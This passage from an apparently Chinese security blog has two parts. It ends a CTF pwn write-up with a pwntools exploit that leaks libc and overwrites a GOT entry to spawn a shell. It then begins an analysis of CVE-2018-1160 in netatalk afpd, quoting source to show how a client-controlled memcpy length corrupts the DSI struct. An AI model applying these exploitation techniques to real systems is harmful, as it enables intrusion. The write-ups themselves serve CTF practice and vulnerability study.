class="title">Go</span><span class="params">(sz,payload)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Input the size:"</span>,str(sz))</span><br><span class="line">    p.sendlineafter(<span class="string">"Input the formula:"</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x4014c8')</span></span><br><span class="line">    payload = str(elf.plt[<span class="string">'printf'</span>])+<span class="string">'\x00'</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x10</span>,<span class="string">'1'</span>)</span><br><span class="line">    payload = payload + <span class="string">"%6$p+%7$p-"</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x34</span>,<span class="string">'p'</span>)</span><br><span class="line">    payload += p64(elf.got[<span class="string">'free'</span>])*<span class="number">2</span></span><br><span class="line">    payload += p64(<span class="number">0x602124</span>+<span class="number">4</span>+<span class="number">0x10</span>)</span><br><span class="line">    Go(<span class="number">0</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">"+0x"</span>)</span><br><span class="line">    libc_base = int(p.recvuntil(<span class="string">'-'</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    payload = str(libc.sym[<span class="string">'system'</span>]&amp;<span class="number">0xffffffff</span>)+<span class="string">'\x00'</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x34</span>,<span class="string">'p'</span>)</span><br><span class="line">    payload += p64(elf.got[<span class="string">'atoi'</span>])*<span class="number">2</span></span><br><span class="line">    payload += p64(<span class="number">0x602124</span>+<span class="number">4</span>)</span><br><span class="line">    Go(<span class="number">0</span>,payload)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input the size:\n"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><p>溢出类型的洞直接IDA patch改小size，UAF的洞比较难patch，需要编写hook.c，在eh_frame写入修改代码，手动清空chunk_list[idx]，具体可以看p4nda师傅的博客<a href="http://p4nda.top/2018/07/02/patch-in-pwn/" target="_blank" rel="noopener">CTF线下赛中常用的PWN题patch方法</a></p>
]]></content>
      <tags>
        <tag>ciscn2020</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-1160 netatalk越界漏洞复现及分析</title>
    <url>/2021/01/07/cve-2018-1160/</url>
    <content><![CDATA[<h1 id="CVE-2018-1160-netatalk越界漏洞复现及分析"><a href="#CVE-2018-1160-netatalk越界漏洞复现及分析" class="headerlink" title="CVE-2018-1160 netatalk越界漏洞复现及分析"></a>CVE-2018-1160 netatalk越界漏洞复现及分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>去年pwnable.tw新上的题目，当时没做出来，今年来解决一下历史遗留问题。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>参考<a href="https://xz.aliyun.com/t/3710" target="_blank" rel="noopener">Netatalk CVE-2018–1160 越界写漏洞分析</a>这篇文章即可，注意要多安装两个库<code>sudo apt install -y libdb++-dev libdb-dev</code>。安装启动即可，不过鉴于我是做pwnable.tw的题，把<code>libatalk.so.18</code>替换一下，使用<code>./afpd -d -F ./afp.conf</code>启动本地的afpd，看下此时的配置文件，端口为5566，因此connect过去即可和其进行交互。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Global]</span><br><span class="line">afp port = 5566</span><br><span class="line">disconnect time = 0</span><br><span class="line">max connections = 1000</span><br><span class="line">sleep time = 0</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>Netatalk</code>是AppleTalk的开源实现方案，可以用作文件服务器来实现文件共享，afpd是其中的一个组件，看名字就知道它是一个类似于httpd的拿来做通信的部分，源码目录的<code>./etc/afpd</code>子目录为相关源码树。看下其中的main函数，前面都是初始化的部分，当请求的类型为<code>LISTEN_FD</code>时会调用<code>dsi_start</code>函数.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">afp_child_t</span> *<span class="title">dsi_start</span><span class="params">(AFPObj *obj, DSI *dsi, <span class="keyword">server_child_t</span> *server_children)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">afp_child_t</span> *child = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dsi_getsession(dsi, server_children, obj-&gt;options.tickleval, &amp;child) != <span class="number">0</span>) &#123;</span><br><span class="line">        LOG(log_error, logtype_afpd, <span class="string">"dsi_start: session error: %s"</span>, strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we've forked. */</span></span><br><span class="line">    <span class="keyword">if</span> (child == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        configfree(obj, dsi);</span><br><span class="line">        afp_over_dsi(obj); <span class="comment">/* start a session */</span></span><br><span class="line">        <span class="built_in">exit</span> (<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> child;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进去看下<code>dsi_getsession</code>，关键的调用如下，函数调用<code>dsi-&gt;proto_open</code>这个函数指针创建了一个新的进程，根据下面的pid号也可以大概看出来是fork出来的，父进程里负责创建新的server监听，创建成功后会使用<code>*childp = child</code>将传入的<code>childp</code>指针赋值并返回0，从而不会进入调用函数的<code>child == NULL</code>处理逻辑。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (pid = dsi-&gt;proto_open(dsi)) &#123; <span class="comment">/* in libatalk/dsi/dsi_tcp.c */</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">  <span class="comment">/* if we fail, just return. it might work later */</span></span><br><span class="line">  LOG(log_error, logtype_dsi, <span class="string">"dsi_getsess: %s"</span>, strerror(errno));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* child. mostly handled below. */</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>: <span class="comment">/* parent */</span></span><br><span class="line">  <span class="comment">/* using SIGKILL is hokey, but the child might not have</span></span><br><span class="line"><span class="comment">   * re-established its signal handler for SIGTERM yet. */</span></span><br><span class="line">  close(ipc_fds[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ((child = server_child_add(serv_children, pid, ipc_fds[<span class="number">0</span>])) ==  <span class="literal">NULL</span>) &#123;</span><br><span class="line">    LOG(log_error, logtype_dsi, <span class="string">"dsi_getsess: %s"</span>, strerror(errno));</span><br><span class="line">    close(ipc_fds[<span class="number">0</span>]);</span><br><span class="line">    dsi-&gt;header.dsi_flags = DSIFL_REPLY;</span><br><span class="line">    dsi-&gt;header.dsi_data.dsi_code = htonl(DSIERR_SERVBUSY);</span><br><span class="line">    dsi_send(dsi);</span><br><span class="line">    dsi-&gt;header.dsi_data.dsi_code = DSIERR_OK;</span><br><span class="line">    kill(pid, SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">  dsi-&gt;proto_close(dsi);</span><br><span class="line">  *childp = child;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反之，子进程使用原先的端口进行交互，根据读取到的<code>dsi-&gt;header.dsi_command</code>确定不同的分支跳转，赋值部分在<code>proto_open</code>函数指针调用处，该指针指向<code>dsi_tcp_open</code>函数，首先通过<code>dsi_stream_read</code>函数读取用户的socket输入到block，再通过memcpy对header赋值。在<code>dsi_getsession</code>初始化返回后，对于子进程来说,当我们赋值的<code>dsi-&gt;header.dsi_command=0x04(DSIFUNC_OPEN)</code>时，会调用<code>dsi_opensession()</code>打开这个session，且<code>*childp</code>被置为空。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (dsi-&gt;header.dsi_command) &#123;</span><br><span class="line"><span class="keyword">case</span> DSIFUNC_STAT: <span class="comment">/* send off status and return */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* OpenTransport 1.1.2 bug workaround: </span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * OT code doesn't currently handle close sockets well. urk.</span></span><br><span class="line"><span class="comment">     * the workaround: wait for the client to close its</span></span><br><span class="line"><span class="comment">     * side. timeouts prevent indefinite resource use. </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">timeout</span> = &#123;</span><span class="number">120</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    fd_set readfds;</span><br><span class="line">    </span><br><span class="line">    dsi_getstatus(dsi);</span><br><span class="line"></span><br><span class="line">    FD_ZERO(&amp;readfds);</span><br><span class="line">    FD_SET(dsi-&gt;socket, &amp;readfds);</span><br><span class="line">    <span class="built_in">free</span>(dsi);</span><br><span class="line">    select(FD_SETSIZE, &amp;readfds, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;timeout);    </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">case</span> DSIFUNC_OPEN: <span class="comment">/* setup session */</span></span><br><span class="line">  <span class="comment">/* set up the tickle timer */</span></span><br><span class="line">  dsi-&gt;timer.it_interval.tv_sec = dsi-&gt;timer.it_value.tv_sec = tickleval;</span><br><span class="line">  dsi-&gt;timer.it_interval.tv_usec = dsi-&gt;timer.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line">  dsi_opensession(dsi);   <span class="comment">//here</span></span><br><span class="line">  *childp = <span class="literal">NULL</span>;         <span class="comment">//here</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>: <span class="comment">/* just close */</span></span><br><span class="line">  LOG(log_info, logtype_dsi, <span class="string">"DSIUnknown %d"</span>, dsi-&gt;header.dsi_command);</span><br><span class="line">  dsi-&gt;proto_close(dsi);</span><br><span class="line">  <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里补充一下关键的数据结构</span></span><br><span class="line"><span class="comment">/* child and parent processes might interpret a couple of these</span></span><br><span class="line"><span class="comment"> * differently. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DSI</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DSI</span> *<span class="title">next</span>;</span>             <span class="comment">/* multiple listening addresses */</span></span><br><span class="line">    AFPObj   *AFPobj;</span><br><span class="line">    <span class="keyword">int</span>      statuslen;</span><br><span class="line">    <span class="keyword">char</span>     status[<span class="number">1400</span>];</span><br><span class="line">    <span class="keyword">char</span>     *signature;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dsi_block</span>        <span class="title">header</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">server</span>, <span class="title">client</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span>        <span class="title">timer</span>;</span></span><br><span class="line">    <span class="keyword">int</span>      tickle;            <span class="comment">/* tickle count */</span></span><br><span class="line">    <span class="keyword">int</span>      in_write;          <span class="comment">/* in the middle of writing multiple packets,</span></span><br><span class="line"><span class="comment">                                   signal handlers can't write to the socket */</span></span><br><span class="line">    <span class="keyword">int</span>      msg_request;       <span class="comment">/* pending message to the client */</span></span><br><span class="line">    <span class="keyword">int</span>      down_request;      <span class="comment">/* pending SIGUSR1 down in 5 mn */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> attn_quantum, datasize, server_quantum;</span><br><span class="line">    <span class="keyword">uint16_t</span> serverID, clientID;</span><br><span class="line">    <span class="keyword">uint8_t</span>  *commands; <span class="comment">/* DSI recieve buffer */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>  data[DSI_DATASIZ];    <span class="comment">/* DSI reply buffer */</span></span><br><span class="line">    <span class="keyword">size_t</span>   datalen, cmdlen;</span><br><span class="line">    <span class="keyword">off_t</span>    read_count, write_count;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;             <span class="comment">/* DSI flags like DSI_SLEEPING, DSI_DISCONNECTED */</span></span><br><span class="line">    <span class="keyword">int</span>      socket;            <span class="comment">/* AFP session socket */</span></span><br><span class="line">    <span class="keyword">int</span>      serversock;        <span class="comment">/* listening socket */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* DSI readahead buffer used for buffered reads in dsi_peek */</span></span><br><span class="line">    <span class="keyword">size_t</span>   dsireadbuf;        <span class="comment">/* size of the DSI readahead buffer used in dsi_peek() */</span></span><br><span class="line">    <span class="keyword">char</span>     *buffer;           <span class="comment">/* buffer start */</span></span><br><span class="line">    <span class="keyword">char</span>     *start;            <span class="comment">/* current buffer head */</span></span><br><span class="line">    <span class="keyword">char</span>     *eof;              <span class="comment">/* end of currently used buffer */</span></span><br><span class="line">    <span class="keyword">char</span>     *end;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_ZEROCONF</span></span><br><span class="line">    <span class="keyword">char</span> *bonjourname;      <span class="comment">/* server name as UTF8 maxlen MAXINSTANCENAMELEN */</span></span><br><span class="line">    <span class="keyword">int</span> zeroconf_registered;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* protocol specific open/close, send/receive</span></span><br><span class="line"><span class="comment">     * send/receive fill in the header and use dsi-&gt;commands.</span></span><br><span class="line"><span class="comment">     * write/read just write/read data */</span></span><br><span class="line">    <span class="keyword">pid_t</span>  (*proto_open)(struct DSI *);</span><br><span class="line">    <span class="keyword">void</span>   (*proto_close)(struct DSI *);</span><br><span class="line">&#125; DSI;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">truct dsi_block &#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> dsi_flags;       <span class="comment">/* packet type: request or reply */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> dsi_command;     <span class="comment">/* command */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> dsi_requestID;  <span class="comment">/* request ID */</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> dsi_code;   <span class="comment">/* error code */</span></span><br><span class="line">        <span class="keyword">uint32_t</span> dsi_doff;   <span class="comment">/* data offset */</span></span><br><span class="line">    &#125; dsi_data;</span><br><span class="line">    <span class="keyword">uint32_t</span> dsi_len;        <span class="comment">/* total data length */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dsi_reserved;   <span class="comment">/* reserved field */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/* accept the socket and do a little sanity checking */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">pid_t</span> <span class="title">dsi_tcp_open</span><span class="params">(DSI *dsi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    SOCKLEN_T len;</span><br><span class="line"></span><br><span class="line">    len = <span class="keyword">sizeof</span>(dsi-&gt;client);</span><br><span class="line">    dsi-&gt;socket = accept(dsi-&gt;serversock, (struct sockaddr *) &amp;dsi-&gt;client, &amp;len);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TCPWRAP</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">request_info</span> <span class="title">req</span>;</span></span><br><span class="line">        request_init(&amp;req, RQ_DAEMON, <span class="string">"afpd"</span>, RQ_FILE, dsi-&gt;socket, <span class="literal">NULL</span>);</span><br><span class="line">        fromhost(&amp;req);</span><br><span class="line">        <span class="keyword">if</span> (!hosts_access(&amp;req)) &#123;</span><br><span class="line">            LOG(deny_severity, logtype_dsi, <span class="string">"refused connect from %s"</span>, eval_client(&amp;req));</span><br><span class="line">            close(dsi-&gt;socket);</span><br><span class="line">            errno = ECONNREFUSED;</span><br><span class="line">            dsi-&gt;socket = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* TCPWRAP */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dsi-&gt;socket &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    getitimer(ITIMER_PROF, &amp;itimer);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == (pid = fork()) ) &#123; <span class="comment">/* child */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span> <span class="title">timer</span> = &#123;</span>&#123;<span class="number">0</span>, <span class="number">0</span>&#125;, &#123;DSI_TCPTIMEOUT, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">newact</span>, <span class="title">oldact</span>;</span></span><br><span class="line">        <span class="keyword">uint8_t</span> block[DSI_BLOCKSIZ];</span><br><span class="line">        <span class="keyword">size_t</span> stored;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* reset signals */</span></span><br><span class="line">        server_reset_signal();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEBUGGING</span></span><br><span class="line">        <span class="comment">/* install an alarm to deal with non-responsive connections */</span></span><br><span class="line">        newact.sa_handler = timeout_handler;</span><br><span class="line">        sigemptyset(&amp;newact.sa_mask);</span><br><span class="line">        newact.sa_flags = <span class="number">0</span>;</span><br><span class="line">        sigemptyset(&amp;oldact.sa_mask);</span><br><span class="line">        oldact.sa_flags = <span class="number">0</span>;</span><br><span class="line">        setitimer(ITIMER_PROF, &amp;itimer, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((sigaction(SIGALRM, &amp;newact, &amp;oldact) &lt; <span class="number">0</span>) ||</span><br><span class="line">            (setitimer(ITIMER_REAL, &amp;timer, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">            LOG(log_error, logtype_dsi, <span class="string">"dsi_tcp_open: %s"</span>, strerror(errno));</span><br><span class="line">            <span class="built_in">exit</span>(EXITERR_SYS);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        dsi_init_buffer(dsi);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read in commands. this is similar to dsi_receive except</span></span><br><span class="line"><span class="comment">         * for the fact that we do some sanity checking to prevent</span></span><br><span class="line"><span class="comment">         * delinquent connections from causing mischief. */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read in the first two bytes */</span></span><br><span class="line">        len = dsi_stream_read(dsi, block, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (!len ) &#123;</span><br><span class="line">            <span class="comment">/* connection already closed, don't log it (normal OSX 10.3 behaviour) */</span></span><br><span class="line">            <span class="built_in">exit</span>(EXITERR_CLOSED);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span> || (block[<span class="number">0</span>] &gt; DSIFL_MAX) || (block[<span class="number">1</span>] &gt; DSIFUNC_MAX)) &#123;</span><br><span class="line">            LOG(log_error, logtype_dsi, <span class="string">"dsi_tcp_open: invalid header"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read in the rest of the header */</span></span><br><span class="line">        stored = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (stored &lt; DSI_BLOCKSIZ) &#123;</span><br><span class="line">            len = dsi_stream_read(dsi, block + stored, <span class="keyword">sizeof</span>(block) - stored);</span><br><span class="line">            <span class="keyword">if</span> (len &gt; <span class="number">0</span>)</span><br><span class="line">                stored += len;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                LOG(log_error, logtype_dsi, <span class="string">"dsi_tcp_open: stream_read: %s"</span>, strerror(errno));</span><br><span class="line">                <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        dsi-&gt;header.dsi_flags = block[<span class="number">0</span>];</span><br><span class="line">        dsi-&gt;header.dsi_command = block[<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_requestID, block + <span class="number">2</span>,</span><br><span class="line">               <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_requestID));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_data.dsi_code, block + <span class="number">4</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_data.dsi_code));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_len, block + <span class="number">8</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_len));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_reserved, block + <span class="number">12</span>,</span><br><span class="line">               <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_reserved));</span><br><span class="line">        dsi-&gt;clientID = ntohs(dsi-&gt;header.dsi_requestID);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* make sure we don't over-write our buffers. */</span></span><br><span class="line">        dsi-&gt;cmdlen = min(ntohl(dsi-&gt;header.dsi_len), dsi-&gt;server_quantum);</span><br><span class="line"></span><br><span class="line">        stored = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (stored &lt; dsi-&gt;cmdlen) &#123;</span><br><span class="line">            len = dsi_stream_read(dsi, dsi-&gt;commands + stored, dsi-&gt;cmdlen - stored);</span><br><span class="line">            <span class="keyword">if</span> (len &gt; <span class="number">0</span>)</span><br><span class="line">                stored += len;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                LOG(log_error, logtype_dsi, <span class="string">"dsi_tcp_open: stream_read: %s"</span>, strerror(errno));</span><br><span class="line">                <span class="built_in">exit</span>(EXITERR_CLNT);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* stop timer and restore signal handler */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEBUGGING</span></span><br><span class="line">        <span class="built_in">memset</span>(&amp;timer, <span class="number">0</span>, <span class="keyword">sizeof</span>(timer));</span><br><span class="line">        setitimer(ITIMER_REAL, &amp;timer, <span class="literal">NULL</span>);</span><br><span class="line">        sigaction(SIGALRM, &amp;oldact, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        LOG(log_info, logtype_dsi, <span class="string">"AFP/TCP session from %s:%u"</span>,</span><br><span class="line">            getip_string((struct sockaddr *)&amp;dsi-&gt;client),</span><br><span class="line">            getip_port((struct sockaddr *)&amp;dsi-&gt;client));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* send back our pid */</span></span><br><span class="line">    <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续看<code>dsi_opensession</code>函数，对<code>dsi-&gt;commands[i++]</code>进行判断，当<code>dsi-&gt;commands[0]=1(DSIOPT_ATTNQUANT)</code>时，进入的分支会对<code>dsi-&gt;attn_quantum</code>这个4字节的整数进行赋值，<code>memcpy(&amp;dsi-&gt;attn_quantum, dsi-&gt;commands + i + 1, dsi-&gt;commands[i]);</code>然而赋值的长度为用户可控值<code>dsi-&gt;commands[i]</code>，dis-&gt;commands是一个char*类型的变量，因此至多拷贝<code>0xff</code>字节数据到该变量中，造成越界写，观察一下dsi的数据结构，我们可以覆写<code>datasize/server_quantum/serverID/clientID/commands/data[DSI_DATASIZ]</code>这些成员，其中<code>server_quantum</code>会回传回来。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* OpenSession. set up the connection */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dsi_opensession</span><span class="params">(DSI *dsi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> i = <span class="number">0</span>; <span class="comment">/* this serves double duty. it must be 4-bytes long */</span></span><br><span class="line">  <span class="keyword">int</span> offs;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (setnonblock(dsi-&gt;socket, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      LOG(log_error, logtype_dsi, <span class="string">"dsi_opensession: setnonblock: %s"</span>, strerror(errno));</span><br><span class="line">      AFP_PANIC(<span class="string">"setnonblock error"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* parse options */</span></span><br><span class="line">  <span class="keyword">while</span> (i &lt; dsi-&gt;cmdlen) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (dsi-&gt;commands[i++]) &#123;</span><br><span class="line">    <span class="keyword">case</span> DSIOPT_ATTNQUANT:</span><br><span class="line">      <span class="built_in">memcpy</span>(&amp;dsi-&gt;attn_quantum, dsi-&gt;commands + i + <span class="number">1</span>, dsi-&gt;commands[i]);<span class="comment">//这里</span></span><br><span class="line">      dsi-&gt;attn_quantum = ntohl(dsi-&gt;attn_quantum);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DSIOPT_SERVQUANT: <span class="comment">/* just ignore these */</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      i += dsi-&gt;commands[i] + <span class="number">1</span>; <span class="comment">/* forward past length tag + length */</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* let the client know the server quantum. we don't use the</span></span><br><span class="line"><span class="comment">   * max server quantum due to a bug in appleshare client 3.8.6. */</span></span><br><span class="line">  dsi-&gt;header.dsi_flags = DSIFL_REPLY;</span><br><span class="line">  dsi-&gt;header.dsi_data.dsi_code = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* dsi-&gt;header.dsi_command = DSIFUNC_OPEN;*/</span></span><br><span class="line"></span><br><span class="line">  dsi-&gt;cmdlen = <span class="number">2</span> * (<span class="number">2</span> + <span class="keyword">sizeof</span>(i)); <span class="comment">/* length of data. dsi_send uses it. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* DSI Option Server Request Quantum */</span></span><br><span class="line">  dsi-&gt;commands[<span class="number">0</span>] = DSIOPT_SERVQUANT;</span><br><span class="line">  dsi-&gt;commands[<span class="number">1</span>] = <span class="keyword">sizeof</span>(i);</span><br><span class="line">  i = htonl(( dsi-&gt;server_quantum &lt; DSI_SERVQUANT_MIN || </span><br><span class="line">	      dsi-&gt;server_quantum &gt; DSI_SERVQUANT_MAX ) ? </span><br><span class="line">	    DSI_SERVQUANT_DEF : dsi-&gt;server_quantum);</span><br><span class="line">  <span class="built_in">memcpy</span>(dsi-&gt;commands + <span class="number">2</span>, &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* AFP replaycache size option */</span></span><br><span class="line">  offs = <span class="number">2</span> + <span class="keyword">sizeof</span>(i);</span><br><span class="line">  dsi-&gt;commands[offs] = DSIOPT_REPLCSIZE;</span><br><span class="line">  dsi-&gt;commands[offs+<span class="number">1</span>] = <span class="keyword">sizeof</span>(i);</span><br><span class="line">  i = htonl(REPLAYCACHE_SIZE);</span><br><span class="line">  <span class="built_in">memcpy</span>(dsi-&gt;commands + offs + <span class="number">2</span>, &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line">  dsi_send(dsi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>尝试拿poc打一下产生了崩溃，这是因为我们覆写了commands指针，后续memcpy的时候产生非法指针访问错误。</p>
